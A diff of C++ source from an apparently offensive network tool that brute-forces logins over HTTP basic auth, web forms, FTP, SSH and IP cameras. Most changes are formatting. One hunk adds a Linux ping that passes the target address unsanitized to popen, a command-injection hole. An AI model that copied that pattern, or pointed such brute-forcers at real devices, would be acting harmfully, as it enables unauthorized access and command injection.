@@ -27,7 +27,8 @@ int _countFTPDirectories(char *recvBuff){
 		dirPtr = strstr(dirPtr + 1, "\n");
 	};
 	return dirCounter;
-};
+}
+
 void BConInc()
 {
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
@@ -41,6 +42,7 @@ __asm
 
 	stt->doEmitionChangeBA(QString::number(BrutingThrds));
 }
+
 void BConDec()
 {
 	if(BrutingThrds > 0)
@@ -58,6 +60,7 @@ void BConDec()
 	stt->doEmitionChangeBA(QString::number(BrutingThrds));
 
 }
+
 bool debugWriteWait = false;
 void _DebugWriteHTMLToFile(char *request, char *buff)
 {
@@ -79,6 +82,7 @@ void _DebugWriteHTMLToFile(char *request, char *buff)
 	};
 	debugWriteWait = false;
 }
+
 unsigned char tl(unsigned char d)
 {
 	if(d >= 192 && d <= 223)
@@ -90,7 +94,8 @@ unsigned char tl(unsigned char d)
 	{
 		return tolower(d);
 	};
-};
+}
+
 int recvWT( 
 	int Socket, 
 	char *Buffer, 
@@ -116,6 +121,7 @@ int recvWT(
 		} 
 		return(n) ; /* trouble */ 
 }
+
 std::string toLowerStr(const char *str)
 {
 	int tsz = strlen(str);
@@ -141,7 +147,8 @@ std::string toLowerStr(const char *str)
 		return tstr;
 	};
 	return "";
-};
+}
+
 int OpenConnection(SOCKET *sock, const char *hostname, int port)
 {   
 	struct hostent *host;
@@ -234,7 +241,8 @@ void _baSSLWorker(char *ip, char *request, char *rvBuff)
 		ERR_error_string(ERR_peek_last_error(), buff2);
 		stt->doEmitionRedFoundData(QString(ip) + " SSL(InitCTX) 1:" + QString(buff1) + " 2:" + QString(buff2));
 	};
-};
+}
+
 char *_getAttributeValue(char *str, char *val, char *ip, int port)
 {
 	char res[1024] = {0};
@@ -276,7 +284,7 @@ char *_getAttributeValue(char *str, char *val, char *ip, int port)
 		stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
 		return "";
 	};
-};
+}
 
 #define HASHLEN 16
 typedef char HASH[HASHLEN];
@@ -363,7 +371,7 @@ char *_makeDigestResponse(
 	char responseMD5[64] = {0};
 	CvtHex(response, responseMD5);
 	return (char*)responseMD5;
-};
+}
 
 lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 {
@@ -846,6 +854,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
 }
+
 lopaStr Connector::_BALobby(char *cookie, char *ip, int port, char *path, char *method, char *data = NULL)
 {
 	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);
@@ -855,7 +864,7 @@ lopaStr Connector::_BALobby(char *cookie, char *ip, int port, char *path, char *
 	BConDec();
 	
 	return res;
-};
+}
 
 lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 {
@@ -1128,7 +1137,6 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 								return lps;
 							};
 
-#pragma region Get pasv Port
 							char *ptr0 = strstr(recvBuff2, "227 ");
 
 							if( ptr0 != NULL )
@@ -1271,7 +1279,8 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 	isActive = 0;
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
-};
+}
+
 lopaStr Connector::_FTPLobby(char *ip, int port, PathStr *ps)
 {
 	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);
@@ -1286,7 +1295,7 @@ lopaStr Connector::_FTPLobby(char *ip, int port, PathStr *ps)
 	BConDec();
 	
 	return lps;
-};
+}
 
 int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 {
@@ -1427,11 +1436,13 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 		stt->doEmitionRedFoundData(QString(iph) + ":" + QString(porth) + " SSL(InitCTX) 1:" + QString(buff1) + " 2:" + QString(buff2));
 		return -1;
 	}
-};
+}
+
 int Connector::_EstablishSSLConnection(char *iph, int porth, char *requesth, conSTR *CSTR)
 {
 	return _sslConnectTo(iph, porth, requesth, CSTR);
-};
+}
+
 void __deleteExcessiveNullBytes(char *buff, int sz)
 {
 	int j = 0;
@@ -1439,7 +1450,8 @@ void __deleteExcessiveNullBytes(char *buff, int sz)
 	{
 		if(buff[i] != 0) buff[j++] = buff[i];
 	};
-};
+}
+
 struct linger linger = { 0 };
 int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *CSTR, int force)
 {
@@ -1677,7 +1689,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 		recvBuff2 = NULL;
 		return -1;
 	};
-};
+}
 
 #pragma region WF
 lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionVal, char *userVal, char *passVal, char *formVal)
@@ -1967,7 +1979,8 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
-};
+}
+
 lopaStr Connector::_WFLobby(char *cookie, char *ip, int port, char *methodVal, char *actionVal, char *userVal, char *passVal, char *formVal)
 {
 	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);
@@ -1979,7 +1992,7 @@ lopaStr Connector::_WFLobby(char *cookie, char *ip, int port, char *methodVal, c
 	BConDec();
 	
 	return res;
-};
+}
 
 #pragma region SSH
 int _sshConnect(char *user, char *pass, char *host, int port)
@@ -2028,7 +2041,8 @@ int _sshConnect(char *user, char *pass, char *host, int port)
 	ssh_free(my_ssh_session);
 	++ssh;
 	return 0;
-};
+}
+
 char *_get_ssh_banner(char *ip, int port)
 {
 	Connector con;
@@ -2045,7 +2059,8 @@ char *_get_ssh_banner(char *ip, int port)
 		CSTR.lowerBuff = NULL;
 	};
 	return recvBuff;
-};
+}
+
 int check_ssh_pass(char *user, char *pass, char *userPass, char *host, int port, conSTR *CSTR, char *banner)
 {
 	int res = -1;
@@ -2069,7 +2084,8 @@ int check_ssh_pass(char *user, char *pass, char *userPass, char *host, int port,
 		return 0;
 	};
 	return res;
-};
+}
+
 int _EstablishSSHConnection(char *host, int port, conSTR *CSTR, char *banner)
 {
 	CSTR->lowerBuff = NULL;
@@ -2112,7 +2128,7 @@ int _EstablishSSHConnection(char *host, int port, conSTR *CSTR, char *banner)
 	BConDec();
 	isActive = 0;
 	return -1;
-};
+}
 
 #pragma region IPCAMWeb
 int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int passCounter, char *type, std::vector<char*> negVector)
@@ -2207,7 +2223,8 @@ int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int
 
 	CSSOCKET(sock);
 	return 0;
-};
+}
+
 lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 {
 	lopaStr lps;
@@ -2508,7 +2525,8 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 	isActive = 0;
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
-};
+}
+
 lopaStr Connector::_IPCameraBLobby(char *ip, int port, char *SPEC)
 {
 	while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);
@@ -2518,8 +2536,10 @@ lopaStr Connector::_IPCameraBLobby(char *ip, int port, char *SPEC)
 	BConDec();
 	
 	return res;
-};
+}
 
+
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
 int _pingMyTarget(char *ip)
 {
 	HANDLE hIcmpFile;
@@ -2554,7 +2574,7 @@ int _pingMyTarget(char *ip)
     
     
     dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData), 
-        NULL, ReplyBuffer, ReplySize, gPingTimeout);
+        NULL, ReplyBuffer, ReplySize, gPingTimeout*1000);
     if (dwRetVal != 0) {
         PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
         struct in_addr ReplyAddr;
@@ -2579,7 +2599,32 @@ int _pingMyTarget(char *ip)
 		if(gDebugMode) stt->doEmitionRedFoundData("[Pinger] Call to IcmpSendEcho failed. IcmpSendEcho returned error: " + QString::number(GetLastError()));
 		return 0;
     };
-};
+}
+#else
+int _pingMyTarget(char *ip)
+{
+    FILE *pipe = popen(("ping -w " + std::to_string(gPingTimeout) + " " + ip).c_str(), "r");
+    if(!pipe) {
+        stt->doEmitionRedFoundData("Ping pipe failed: cannot open pipe.");
+        perror("pipe");
+        return 0;
+    }
+
+    char buffer[128] = {0};
+    std::string result;
+
+    while(!feof(pipe)) {
+        if(fgets(buffer, 128, pipe) != NULL){
+            result += buffer;
+        }
+    }
+    pclose(pipe);
+
+    if(strstr((char*)result.c_str(), "100% packet loss") != NULL) return 0;
+    return 1;
+}
+#endif
+
 QString strIP;
 QString strPort;
 const char *buff1 = "GET / HTTP/1.1\r\nHost: ";
@@ -2592,7 +2637,8 @@ int Connector::_SSHLobby(char *ip, int port, conSTR *CSTR)
 	{
 		return _EstablishSSHConnection(ip, port, CSTR, banner);
 	};
-};
+}
+
 int Connector::_ConnectToPort(char *ip, const char *portC, char *hl)
 {	
 	if(gPingNScan)
@@ -2644,4 +2690,4 @@ int Connector::_ConnectToPort(char *ip, const char *portC, char *hl)
 		CSTR.lowerBuff = NULL;
 	};
 	strFlag = 1;
-};
+}
